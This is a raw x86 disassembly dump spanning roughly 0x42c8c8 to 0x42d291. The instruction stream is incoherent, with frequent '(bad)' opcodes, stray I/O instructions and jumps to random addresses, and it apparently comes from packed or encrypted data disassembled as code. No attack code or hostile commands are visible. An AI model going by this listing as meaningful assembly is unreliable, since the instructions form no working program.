  42c8c8:	es pop ss
  42c8ca:	loopne 0x42c880
  42c8cc:	xor    al,0xff
  42c8ce:	aam    0x42
  42c8d0:	cmp    al,0xf
  42c8d2:	pop    eax
  42c8d3:	sbb    ebp,ebx
  42c8d5:	shl    DWORD PTR [esi],1
  42c8d7:	mov    ds:0xc3143580,al
  42c8dc:	bound  ebx,QWORD PTR [ebp-0xa18573b]
  42c8e2:	retf   
  42c8e3:	adc    BYTE PTR [ebp+0x417eaecc],dh
  42c8e9:	cs xchg cl,al
  42c8ec:	mov    eax,ds:0x1aebc7d0
  42c8f1:	cwde   
  42c8f2:	and    al,0x3e
  42c8f4:	xchg   ecx,eax
  42c8f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c8f6:	in     eax,dx
  42c8f7:	dec    esp
  42c8f8:	adc    DWORD PTR [ecx-0x4d],0x46
  42c8fc:	mov    eax,ds:0xbabaad9
  42c901:	jbe    0x42c905
  42c903:	sahf   
  42c904:	pop    esi
  42c905:	push   edx
  42c906:	cmp    eax,0xea5bf3fc
  42c90b:	mov    ah,BYTE PTR [edi+0xc15ef4]
	...
  42c971:	add    BYTE PTR [eax],al
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x8c49c480
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	mov    esp,0x16ab8fd1
  42c991:	nop
  42c992:	lods   eax,DWORD PTR ds:[esi]
  42c993:	mov    ds:0xaa9d3edd,al
  42c998:	neg    bh
  42c99a:	and    bl,dl
  42c99c:	sti    
  42c99d:	call   0xe9cca3fb
  42c9a2:	js     0x42c9cf
  42c9a4:	inc    eax
  42c9a5:	fld    TBYTE PTR [eax+0x24]
  42c9a8:	cmp    BYTE PTR [ebx+0x41],al
  42c9ab:	jmp    0x7f0f649f
  42c9b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c9b1:	fldcw  WORD PTR [ebx]
  42c9b3:	dec    esi
  42c9b4:	add    al,0x64
  42c9b6:	sub    eax,0xb0f98315
  42c9bb:	sub    edi,DWORD PTR [edx]
  42c9bd:	hlt    
  42c9be:	jmp    0xb9b3fac9
  42c9c3:	dec    esp
  42c9c4:	in     al,dx
  42c9c5:	mov    esi,0x35781667
  42c9ca:	adc    al,0xf
  42c9cc:	scas   eax,DWORD PTR es:[edi]
  42c9cd:	mov    dh,0x32
  42c9cf:	lahf   
  42c9d0:	jne    0x42c96d
  42c9d2:	cmp    al,BYTE PTR [esi+0x22]
  42c9d5:	rcl    BYTE PTR [edx-0x80],1
  42c9d8:	sub    eax,0xd99b8fbd
  42c9dd:	test   BYTE PTR [ebx+ebx*8-0x76e8e54c],0x84
  42c9e5:	mov    eax,ds:0xad013efb
  42c9ea:	push   esi
  42c9eb:	fwait
  42c9ec:	inc    edx
  42c9ed:	or     BYTE PTR [esi-0x2f],0x2c
  42c9f1:	dec    esp
  42c9f2:	loop   0x42c993
  42c9f4:	lds    ebx,FWORD PTR [edx-0x36]
  42c9f7:	dec    bl
  42c9f9:	sub    edx,DWORD PTR [eax-0x12]
  42c9fc:	pop    ecx
  42c9fd:	imul   ecx,ecx,0x7c
  42ca00:	jns    0x42ca3c
  42ca02:	outs   dx,DWORD PTR ds:[esi]
  42ca03:	call   0xec8d:0x782ec758
  42ca0a:	and    al,0x4c
  42ca0c:	jb     0x42c9f4
  42ca0e:	aad    0x5b
  42ca10:	std    
  42ca11:	mov    ah,0x5c
  42ca13:	loope  0x42c9aa
  42ca15:	jecxz  0x42ca35
  42ca17:	scas   eax,DWORD PTR es:[edi]
  42ca18:	and    edx,esp
  42ca1a:	inc    ebp
  42ca1b:	scas   al,BYTE PTR es:[edi]
  42ca1c:	outs   dx,BYTE PTR ds:[esi]
  42ca1d:	rcl    esp,cl
  42ca1f:	cmp    esp,DWORD PTR [ebx+0x65ba9647]
  42ca25:	out    0xad,al
  42ca27:	mov    edx,ebp
  42ca29:	push   ebp
  42ca2a:	sub    BYTE PTR [ebx+eiz*8],ch
  42ca2d:	loopne 0x42ca70
  42ca2f:	retf   
  42ca30:	into   
  42ca31:	outs   dx,DWORD PTR ds:[esi]
  42ca32:	jae    0x42caae
  42ca34:	sub    ebx,esi
  42ca36:	(bad)  
  42ca37:	xor    esp,esp
  42ca39:	mov    BYTE PTR [esi-0x768d45bb],al
  42ca3f:	push   0x20
  42ca41:	mov    eax,0x503f3e6e
  42ca46:	inc    ebp
  42ca47:	fistp  QWORD PTR [ecx]
  42ca49:	sbb    DWORD PTR [edx+0x72],esi
  42ca4c:	js     0x42ca33
  42ca4e:	push   esi
  42ca4f:	(bad)  
  42ca50:	or     esi,ebx
  42ca52:	push   eax
  42ca53:	(bad)  
  42ca54:	push   eax
  42ca55:	pop    ebp
  42ca56:	(bad)  
  42ca57:	(bad)  
  42ca59:	and    al,0x63
  42ca5b:	les    ebx,FWORD PTR [ebx-0x6496318c]
  42ca61:	jae    0x42c9ff
  42ca63:	pop    esp
  42ca64:	push   ss
  42ca65:	jae    0x42ca70
  42ca67:	push   0x36
  42ca69:	mov    ds:0x1ebbf5c2,al
  42ca6e:	dec    BYTE PTR [eax+ebx*4-0xd]
  42ca72:	pop    ds
  42ca73:	jb     0x42c9fa
  42ca75:	pop    ebx
  42ca76:	ret    0x5498
  42ca79:	add    eax,0x9097622d
  42ca7e:	dec    edi
  42ca7f:	sbb    ecx,eax
  42ca81:	dec    ecx
  42ca82:	mov    ch,0x77
  42ca84:	mov    edi,DWORD PTR [edx]
  42ca86:	inc    esp
  42ca87:	mov    esi,0x37cc21be
  42ca8c:	jl     0x42ca9f
  42ca8e:	fcomi  st,st(3)
	...
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0x1ca49140]
  42cb02:	mul    BYTE PTR [edi]
  42cb04:	cld    
  42cb05:	fld    QWORD PTR [ecx]
  42cb07:	add    BYTE PTR [ecx+eax*1],al
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	pop    esp
  42cb0d:	add    esp,DWORD PTR [ebx+0x4]
  42cb10:	sub    eax,0xb41915f1
  42cb15:	in     eax,0x8
  42cb17:	sub    al,0x64
  42cb19:	xchg   BYTE PTR [ebx+0x71],bl
  42cb1c:	ret    0x3c89
  42cb1f:	into   
  42cb20:	fnsave [esi-0x76]
  42cb23:	lea    edi,[eax-0x7e]
  42cb26:	ret    0xeade
  42cb29:	aad    0x10
  42cb2b:	push   esp
  42cb2c:	int3   
  42cb2d:	mov    ?,ecx
  42cb2f:	push   es
  42cb30:	sbb    dl,ch
  42cb32:	sti    
  42cb33:	cmovbe esi,DWORD PTR [ebx]
  42cb36:	sub    BYTE PTR [ebx],0xc8
  42cb39:	inc    eax
  42cb3a:	(bad)  
  42cb3b:	lock icebp 
  42cb3d:	in     al,0xe7
  42cb3f:	jne    0x42cb55
  42cb41:	fdivr  QWORD PTR [edi+0x15]
  42cb44:	push   ds
  42cb45:	push   ds
  42cb46:	les    edx,FWORD PTR [ebp-0x10ffb538]
  42cb4c:	xor    al,0x69
  42cb4e:	add    eax,0x873f3e91
  42cb53:	fild   QWORD PTR [edx+edi*8+0x101d7e2b]
  42cb5a:	ins    DWORD PTR es:[edi],dx
  42cb5b:	sub    BYTE PTR [ebx+0x23],0xc7
  42cb5f:	sub    DWORD PTR [edi+0x2],esp
  42cb62:	pop    ds
  42cb63:	mov    eax,ds:0x772bd249
  42cb68:	aas    
  42cb69:	(bad)  
  42cb6a:	fldcw  WORD PTR [esi+edx*4+0x1e]
  42cb6e:	enter  0xba0,0x81
  42cb72:	and    bh,bh
  42cb74:	(bad)  
  42cb75:	retf   0xb5e9
  42cb78:	test   DWORD PTR [eax+eiz*2-0x79],esp
  42cb7c:	outs   dx,BYTE PTR ds:[esi]
  42cb7d:	int3   
  42cb7e:	inc    ebx
  42cb7f:	ja     0x42cb70
  42cb81:	mov    dl,0xc4
  42cb83:	(bad)  
  42cb84:	or     bl,BYTE PTR [ebx+0x291e0a35]
  42cb8a:	pop    ds
  42cb8b:	xchg   esp,eax
  42cb8c:	pop    ds
  42cb8d:	(bad)  
  42cb8e:	(bad)  
  42cb8f:	cmp    al,0x29
  42cb91:	jno    0x42cb26
  42cb93:	pop    edi
  42cb94:	out    0x3b,eax
  42cb96:	and    al,0xa0
  42cb98:	ret    
  42cb99:	ins    DWORD PTR es:[edi],dx
  42cb9a:	mov    esi,0x58e64145
  42cb9f:	retf   0xe06b
  42cba2:	xchg   DWORD PTR [edx+ebp*2+0x14f294f],ecx
  42cba9:	rcr    BYTE PTR [edi+0x165852da],1
  42cbaf:	pop    ebp
  42cbb0:	into   
  42cbb1:	jne    0x42cbbc
  42cbb3:	outs   dx,BYTE PTR ds:[esi]
  42cbb4:	sbb    BYTE PTR [esi-0x590abb46],bh
  42cbba:	xor    eax,0xd8dda33b
  42cbbf:	ins    BYTE PTR es:[edi],dx
  42cbc0:	aam    0x9e
  42cbc2:	jo     0x42cba1
  42cbc4:	das    
  42cbc5:	ins    DWORD PTR es:[edi],dx
  42cbc6:	xor    edi,eax
  42cbc8:	add    DWORD PTR [edx+edi*1],0xffffffa7
  42cbcc:	xor    bl,ch
  42cbce:	adc    BYTE PTR [eax],dl
  42cbd0:	stos   DWORD PTR es:[edi],eax
  42cbd1:	mov    ebx,0x26ce8018
  42cbd6:	loope  0x42cb8d
  42cbd8:	rcl    BYTE PTR [eax-0x48b38f15],0x51
  42cbdf:	jbe    0x42cc09
  42cbe1:	add    al,0x75
  42cbe3:	pop    ecx
  42cbe4:	cli    
  42cbe5:	(bad)  
  42cbe6:	or     dl,BYTE PTR [edi-0x52cf8b3b]
  42cbec:	or     DWORD PTR [eax],esi
  42cbee:	jmp    0x42cc43
  42cbf0:	push   es
  42cbf1:	xchg   ebx,eax
  42cbf2:	aas    
  42cbf3:	je     0x42cc26
  42cbf5:	outs   dx,BYTE PTR ds:[esi]
  42cbf6:	inc    edi
  42cbf7:	ja     0x42cbcf
  42cbf9:	push   ebp
  42cbfa:	idiv   DWORD PTR [ecx]
  42cbfc:	rol    DWORD PTR [eax+0x5a],1
  42cbff:	popf   
  42cc00:	mov    al,0x83
  42cc02:	mov    cs,WORD PTR [edi+0xa]
  42cc05:	js     0x42cc0a
  42cc07:	or     ch,BYTE PTR [eax]
  42cc09:	sbb    DWORD PTR [edx],esp
  42cc0b:	imul   ecx,edi,0x687055
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0xa2afca21
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	daa    
  42cc8d:	les    ecx,FWORD PTR [edx+eiz*2]
  42cc90:	pop    ecx
  42cc91:	ret    
  42cc92:	cli    
  42cc93:	jne    0x42cc23
  42cc95:	xor    al,0x41
  42cc97:	push   ss
  42cc98:	bound  esp,QWORD PTR [edx-0x75]
  42cc9b:	call   DWORD PTR ds:0x86b08a06
  42cca1:	imul   edi,DWORD PTR [ecx-0xc423721],0x5c17a9ff
  42ccab:	shl    DWORD PTR [ecx-0x10baabde],1
  42ccb1:	xchg   edi,eax
  42ccb2:	std    
  42ccb3:	mov    dl,0x86
  42ccb5:	inc    ebp
  42ccb6:	cmp    DWORD PTR [edi-0xa],ecx
  42ccb9:	outs   dx,DWORD PTR ds:[esi]
  42ccba:	dec    esp
  42ccbb:	aas    
  42ccbc:	out    0x6f,eax
  42ccbe:	test   DWORD PTR [ecx-0x13],0x5061152a
  42ccc5:	out    0x5c,al
  42ccc7:	xchg   edi,eax
  42ccc8:	jmp    0x42cc7f
  42ccca:	push   ecx
  42cccb:	(bad)  
  42cccc:	clc    
  42cccd:	inc    esi
  42ccce:	dec    ebx
  42cccf:	retf   
  42ccd0:	mov    ds:0xe394e852,eax
  42ccd5:	popf   
  42ccd6:	not    BYTE PTR [edx+edx*4-0x5e7f516a]
  42ccdd:	outs   dx,BYTE PTR ds:[esi]
  42ccde:	sub    DWORD PTR [esi+0x4],ebp
  42cce1:	dec    edx
  42cce2:	loopne 0x42cce1
  42cce4:	jae    0x42cd40
  42cce6:	fs push cs
  42cce8:	popf   
  42cce9:	addr16 test al,0x75
  42ccec:	test   eax,0x9ba487e4
  42ccf1:	mov    esp,0xb577f0fb
  42ccf6:	pop    esp
  42ccf7:	jnp    0x42cd44
  42ccf9:	push   ebx
  42ccfa:	shl    ebp,0x51
  42ccfd:	and    al,0x4a
  42ccff:	lock loop 0x42cd2f
  42cd02:	sub    eax,DWORD PTR [eax+edi*1]
  42cd05:	std    
  42cd06:	pop    esp
  42cd07:	dec    edi
  42cd08:	xor    BYTE PTR ss:[ebx],ah
  42cd0b:	int3   
  42cd0c:	test   BYTE PTR [ebx],ah
  42cd0e:	popa   
  42cd0f:	mov    cs,WORD PTR [eax]
  42cd11:	cvtps2pd xmm6,QWORD PTR [edx]
  42cd14:	adc    al,0xc5
  42cd16:	inc    edx
  42cd17:	fsubr  QWORD PTR [ecx+0x79c7f305]
  42cd1d:	or     DWORD PTR es:[edi],0xffffffc0
  42cd21:	outs   dx,BYTE PTR ds:[esi]
  42cd22:	or     DWORD PTR [esi-0xe],0x60
  42cd26:	lds    edi,FWORD PTR [esi+0x14eb0d1a]
  42cd2c:	rol    cl,cl
  42cd2e:	aaa    
  42cd2f:	fdiv   DWORD PTR [esi+0x4b]
  42cd32:	gs cld 
  42cd34:	dec    edi
  42cd35:	into   
  42cd36:	out    dx,al
  42cd37:	or     eax,DWORD PTR [edi]
  42cd39:	addr16 sbb ebp,ebp
  42cd3c:	add    ebp,esi
  42cd3e:	pop    edi
  42cd3f:	les    edi,FWORD PTR [eax+0x56]
  42cd42:	lock js 0x42cd9f
  42cd45:	out    dx,eax
  42cd46:	inc    ebx
  42cd47:	mov    ebp,0xbd658626
  42cd4c:	push   ebp
  42cd4d:	dec    ecx
  42cd4e:	dec    esp
  42cd4f:	in     al,dx
  42cd50:	jno    0x42cd0c
  42cd52:	sbb    BYTE PTR [eax+ebx*1+0x50773616],ah
  42cd59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd5a:	das    
  42cd5b:	outs   dx,BYTE PTR ds:[esi]
  42cd5c:	sbb    DWORD PTR [ebx+0x15e74778],0xe1f77a5f
  42cd66:	adc    ch,cl
  42cd68:	aam    0xf
  42cd6a:	loop   0x42cddb
  42cd6c:	(bad)  [eax-0x70]
  42cd6f:	push   ecx
  42cd70:	retf   
  42cd71:	add    ah,BYTE PTR [edx-0x216454ab]
  42cd77:	pop    ss
  42cd78:	cmp    DWORD PTR [edi+0x10],esi
  42cd7b:	inc    edi
  42cd7c:	xchg   esi,eax
  42cd7d:	fwait
  42cd7e:	gs inc ebx
  42cd80:	mov    ebx,0xc8004798
  42cd85:	xchg   esi,eax
  42cd86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cd87:	(bad)  
  42cd88:	pusha  
  42cd89:	neg    BYTE PTR [ecx-0x78]
  42cd8c:	pop    ss
  42cd8d:	mov    BYTE PTR [edx+ecx*4+0x0],0x0
	...
  42cdf1:	add    BYTE PTR [eax],al
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0xec
  42ce01:	cmp    al,0xa
  42ce03:	xchg   BYTE PTR [eax+eiz*8],al
  42ce06:	add    DWORD PTR [eax],eax
  42ce08:	add    al,0x1
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	push   esi
  42ce0d:	or     al,0xdd
  42ce0f:	sbb    eax,0xc6df1476
  42ce14:	pop    ebx
  42ce15:	paddw  mm1,QWORD PTR [ecx+0x5d595bac]
  42ce1c:	jge    0x42ce5e
  42ce1e:	inc    ebp
  42ce1f:	call   0x3bb6:0xf2b331b
  42ce26:	in     eax,0xbc
  42ce28:	cmp    eax,0xb1dfab14
  42ce2d:	push   ss
  42ce2e:	sahf   
  42ce2f:	mov    WORD PTR [ecx-0x17],?
  42ce32:	aad    0x5f
  42ce34:	add    bh,bh
  42ce36:	pop    esp
  42ce37:	(bad)  
  42ce38:	imul   edi,DWORD PTR [ebx],0x3e
  42ce3b:	pop    edx
  42ce3c:	gs repnz loope 0x42cddb
  42ce40:	sbb    DWORD PTR [edi+0x5e],esp
  42ce43:	cs cs scas eax,DWORD PTR es:[edi]
  42ce46:	lds    ecx,FWORD PTR [ecx]
  42ce48:	test   DWORD PTR [edi],0x3c7faca2
  42ce4e:	lock mov esp,0x8d7e7523
  42ce54:	dec    ebp
  42ce55:	mov    esi,0x878d4091
  42ce5a:	fimul  DWORD PTR [edx+0x3390a5e6]
  42ce61:	xchg   ebp,eax
  42ce62:	jo     0x42cedf
  42ce64:	jbe    0x42ce2a
  42ce66:	dec    ebp
  42ce67:	les    esp,FWORD PTR [ecx+ecx*4-0x1e]
  42ce6b:	js     0x42ced6
  42ce6d:	popa   
  42ce6e:	ret    0x3c01
  42ce71:	les    ecx,FWORD PTR [edx-0x3a85dff6]
  42ce77:	pusha  
  42ce78:	push   ebp
  42ce79:	jnp    0x42cec2
  42ce7b:	inc    ebp
  42ce7c:	mov    bl,0x6e
  42ce7e:	nop
  42ce7f:	jge    0x42ce58
  42ce81:	adc    ah,bl
  42ce83:	xchg   ebx,eax
  42ce84:	outs   dx,BYTE PTR ds:[esi]
  42ce85:	sub    al,BYTE PTR [ebx]
  42ce87:	dec    edx
  42ce88:	dec    edx
  42ce89:	xor    dl,bh
  42ce8b:	inc    esi
  42ce8c:	inc    esp
  42ce8d:	cmp    dl,ch
  42ce8f:	adc    eax,0xe498f75
  42ce94:	push   cs
  42ce95:	nop
  42ce96:	push   eax
  42ce97:	or     DWORD PTR [esi],ebx
  42ce99:	fimul  DWORD PTR [ebx+0x7]
  42ce9c:	jmp    0x537c:0x47a7e859
  42cea3:	call   FWORD PTR [eax-0x60]
  42cea6:	sub    DWORD PTR [ebp+edx*2+0x5f825fbf],esi
  42cead:	xchg   edi,eax
  42ceae:	out    0x1b,eax
  42ceb0:	dec    ebx
  42ceb1:	enter  0x8327,0xed
  42ceb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ceb6:	or     eax,0x2c5ef737
  42cebb:	push   ds
  42cebc:	inc    esp
  42cebd:	imul   ebp,esp,0x7b
  42cec0:	outs   dx,BYTE PTR ds:[esi]
  42cec1:	xor    bh,BYTE PTR [edx+esi*1-0x4e48417c]
  42cec8:	jl     0x42ce6b
  42ceca:	fcmovbe st,st(3)
  42cecc:	sbb    eax,0xe623f288
  42ced1:	adc    dh,ah
  42ced3:	(bad)  
  42ced4:	ins    DWORD PTR es:[edi],dx
  42ced5:	jae    0x42ceb6
  42ced7:	push   ds
  42ced8:	or     esp,DWORD PTR [ecx]
  42ceda:	pop    es
  42cedb:	mov    ecx,0x541fe12a
  42cee0:	repnz xor eax,0x8e569784
  42cee6:	out    0x95,al
  42cee8:	sbb    DWORD PTR [esi],eax
  42ceea:	and    ebp,eax
  42ceec:	xchg   edi,eax
  42ceed:	daa    
  42ceee:	push   edi
  42ceef:	mov    ebp,0x3b991f32
  42cef4:	nop
  42cef5:	mov    ecx,0x2b218ebd
  42cefa:	cli    
  42cefb:	fcomi  st,st(6)
  42cefd:	dec    ecx
  42cefe:	mov    edi,?
  42cf00:	dec    eax
  42cf01:	addr16 iret 
  42cf03:	cmp    DWORD PTR [ebp+ebx*2-0x1835e71d],ebx
  42cf0a:	arpl   WORD PTR [ecx+0x76],si
  42cf0d:	jl     0x42cf3e
  42cf0f:	xor    al,0x0
	...
  42cf71:	add    BYTE PTR [eax],al
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    eax,FWORD PTR [ebp+0x49]
  42cf82:	enter  0x895,0xe1
  42cf86:	add    DWORD PTR [eax],eax
  42cf88:	add    al,0x1
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf8d:	rcr    BYTE PTR [esi+0x4e],cl
  42cf90:	mov    bh,0xa4
  42cf92:	mov    ds:0xfeb15b5b,al
  42cf97:	jge    0x42cfea
  42cf99:	push   ebp
  42cf9a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf9c:	inc    edi
  42cf9d:	rcr    DWORD PTR [esi+esi*8-0x5c],cl
  42cfa1:	outs   dx,DWORD PTR ds:[esi]
  42cfa2:	or     al,0xb9
  42cfa4:	(bad)  [esi-0x2e]
  42cfa7:	adc    BYTE PTR [edi-0xe3643a],cl
  42cfad:	sbb    BYTE PTR [edi],bl
  42cfaf:	aaa    
  42cfb0:	test   dl,ch
  42cfb2:	pop    eax
  42cfb3:	nop
  42cfb4:	and    al,0x1e
  42cfb6:	xchg   esp,eax
  42cfb7:	xchg   esi,eax
  42cfb8:	and    eax,0x789d33cc
  42cfbd:	adc    ch,bl
  42cfbf:	ins    DWORD PTR es:[edi],dx
  42cfc0:	das    
  42cfc1:	cmp    al,0xc5
  42cfc3:	arpl   WORD PTR [ecx+0x16d3615b],cx
  42cfc9:	dec    edx
  42cfca:	mov    esp,DWORD PTR [edx+eiz*1+0x71]
  42cfce:	add    al,0x15
  42cfd0:	and    ch,ch
  42cfd2:	cld    
  42cfd3:	pusha  
  42cfd4:	push   ebx
  42cfd5:	adc    DWORD PTR [edi+0x7a],ebp
  42cfd8:	sbb    ebx,DWORD PTR [ebx+0x675feb23]
  42cfde:	mov    bl,0xc0
  42cfe0:	fwait
  42cfe1:	sub    al,al
  42cfe3:	pop    ecx
  42cfe4:	add    esp,DWORD PTR [esi+0x34344334]
  42cfea:	xor    ebx,esi
  42cfec:	out    0x98,eax
  42cfee:	(bad)  
  42cfef:	xchg   esp,eax
  42cff0:	sbb    eax,0x235b8dc2
  42cff5:	fldpi  
  42cff7:	jp     0x42cffa
  42cff9:	adc    al,0x63
  42cffb:	and    ecx,esi
  42cffd:	push   cs
  42cffe:	cs sub al,dl
  42d001:	cdq    
  42d002:	cs and eax,0xca51133
  42d008:	jo     0x42d014
  42d00a:	call   0x48ab:0xf26c107d
  42d011:	shl    BYTE PTR [esi+0x29],1
  42d014:	rcr    BYTE PTR [edx-0x6d],0x67
  42d018:	call   0x6072:0x3526965d
  42d01f:	jp     0x42d09c
  42d021:	add    al,0xec
  42d023:	push   0x11135163
  42d028:	iret   
  42d029:	or     ch,BYTE PTR [ebp+0x15]
  42d02c:	imul   edi,DWORD PTR [ecx],0xc92f93e7
  42d032:	lods   eax,DWORD PTR ds:[esi]
  42d033:	js     0x42d008
  42d035:	mov    al,ds:0xe288e9cb
  42d03a:	fwait
  42d03b:	xchg   ebp,eax
  42d03c:	or     DWORD PTR [edx-0x4907bfed],esp
  42d042:	mov    eax,0x1482d4a9
  42d047:	add    edi,DWORD PTR es:[esi+edi*2-0x531eafc3]
  42d04f:	js     0x42d064
  42d051:	pop    ss
  42d052:	fidivr DWORD PTR [edi-0x372a70a4]
  42d058:	push   esi
  42d059:	cmp    ah,al
  42d05b:	xchg   edi,eax
  42d05c:	into   
  42d05d:	mov    edx,DWORD PTR [ebx+0x6bb6f8ee]
  42d063:	mov    eax,gs
  42d065:	push   esp
  42d066:	jge    0x42d07b
  42d068:	pop    ebx
  42d069:	or     esp,esp
  42d06b:	and    edx,eax
  42d06d:	xchg   DWORD PTR [edi-0x53],ebp
  42d070:	(bad)  
  42d071:	cmp    eax,ebx
  42d073:	and    esi,ebp
  42d075:	or     dh,BYTE PTR [edx-0xc]
  42d078:	or     eax,0x6b13d6f8
  42d07d:	xchg   esp,eax
  42d07e:	jb     0x42d0f2
  42d080:	sub    dh,ch
  42d082:	not    esp
  42d084:	cmc    
  42d085:	les    ebx,FWORD PTR [esi-0x66]
  42d088:	test   al,0xe6
  42d08a:	jo     0x42d04a
  42d08c:	ret    
  42d08d:	xchg   edx,eax
  42d08e:	sub    bh,BYTE PTR [ecx]
	...
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [esi+0xc131a30],bh
  42d105:	loop   0x42d108
  42d107:	add    BYTE PTR [ecx+eax*1],al
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	jmp    0xa0181213
  42d111:	ret    0xb24e
  42d114:	nop
  42d115:	stos   BYTE PTR es:[edi],al
  42d116:	mov    DWORD PTR [edx],ecx
  42d118:	ror    DWORD PTR [ebx+eiz*8-0x30],1
  42d11c:	mov    ds:0x2b1532ad,al
  42d121:	shr    BYTE PTR [ebx],1
  42d123:	loopne 0x42d16a
  42d125:	lods   al,BYTE PTR ds:[esi]
  42d126:	jge    0x42d16b
  42d128:	hlt    
  42d129:	cmp    ah,BYTE PTR [edi+ebx*2-0x3e]
  42d12d:	cmp    ebp,DWORD PTR [ebp-0x16]
  42d130:	popf   
  42d131:	xor    cl,BYTE PTR [esi+eax*4]
  42d134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d135:	mov    eax,ds:0xf7edf556
  42d13a:	mov    edi,0xfd2568a5
  42d13f:	pop    eax
  42d140:	cs push ebx
  42d142:	dec    edi
  42d143:	mov    al,0xae
  42d145:	jo     0x42d1aa
  42d147:	push   0xedd015a5
  42d14c:	cmp    eax,0x2f8c8978
  42d151:	loope  0x42d145
  42d153:	and    dl,0x15
  42d156:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d158:	mov    bh,al
  42d15a:	call   FWORD PTR [ebx+eax*2+0x29]
  42d15e:	mov    dh,ah
  42d160:	jle    0x42d153
  42d162:	aam    0x42
  42d164:	jae    0x42d119
  42d166:	jns    0x42d1be
  42d168:	pop    esi
  42d169:	xchg   ebx,eax
  42d16a:	push   ecx
  42d16b:	gs cmc 
  42d16d:	mov    ch,0xab
  42d16f:	ss loop 0x42d1a6
  42d172:	sub    eax,0xcaf3faac
  42d177:	sbb    eax,0xc25b025
  42d17c:	mov    dh,bh
  42d17e:	inc    esi
  42d17f:	xor    eax,0xf61cb63f
  42d184:	mov    eax,ds:0x69267691
  42d189:	scas   al,BYTE PTR es:[edi]
  42d18a:	test   eax,0x909b9b63
  42d18f:	cmc    
  42d190:	stc    
  42d191:	and    al,0xce
  42d193:	not    ebp
  42d195:	(bad)  
  42d197:	adc    BYTE PTR [edi+0x242f7431],dh
  42d19d:	or     eax,DWORD PTR [eax-0x594c675f]
  42d1a3:	cmp    edi,DWORD PTR [edi+0x35152770]
  42d1a9:	sub    bl,BYTE PTR ds:0xad55fd44
  42d1af:	jg     0x42d1e1
  42d1b1:	adc    ah,BYTE PTR [ebp+0x32271954]
  42d1b7:	stc    
  42d1b8:	mov    ds:0x1dc7dde6,al
  42d1bd:	stos   DWORD PTR es:[edi],eax
  42d1be:	pop    esi
  42d1bf:	push   ss
  42d1c0:	dec    edx
  42d1c1:	cmp    al,0x54
  42d1c3:	push   esi
  42d1c4:	xor    eax,0x5faa5bda
  42d1c9:	paddq  mm5,QWORD PTR [esi]
  42d1cc:	cmp    eax,0x725b3765
  42d1d1:	dec    eax
  42d1d2:	outs   dx,BYTE PTR ds:[esi]
  42d1d3:	ins    BYTE PTR es:[edi],dx
  42d1d4:	cdq    
  42d1d5:	imul   eax,ebp,0x5b
  42d1d8:	jbe    0x42d1ee
  42d1da:	inc    edi
  42d1db:	pushf  
  42d1dc:	mov    edi,0xa9b994ba
  42d1e1:	xor    eax,0x8787a427
  42d1e6:	popa   
  42d1e7:	ja     0x42d17a
  42d1e9:	lea    edi,[eax*1-0x58289893]
  42d1f0:	xor    DWORD PTR [ebx],ebx
  42d1f2:	inc    edi
  42d1f3:	inc    edi
  42d1f4:	inc    ebx
  42d1f5:	lock jle 0x42d1c5
  42d1f8:	imul   ecx,DWORD PTR [edx],0x69
  42d1fb:	loopne 0x42d252
  42d1fd:	add    al,BYTE PTR [esi-0x77bde4cb]
  42d203:	pop    ebx
  42d204:	adc    eax,0xfb1e7b75
  42d209:	mov    edi,0x7fb214d8
  42d20e:	repnz add eax,DWORD PTR [eax]
	...
  42d271:	add    BYTE PTR [eax],al
  42d273:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d20b
  42d281:	sub    esi,DWORD PTR [edi-0x30]
  42d284:	adc    bl,ah
  42d286:	add    DWORD PTR [eax],eax
  42d288:	add    al,0x1
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	pop    ecx
  42d28d:	aas    
  42d28e:	sbb    DWORD PTR [esi-0x10],ecx
  42d291:	setge  bl
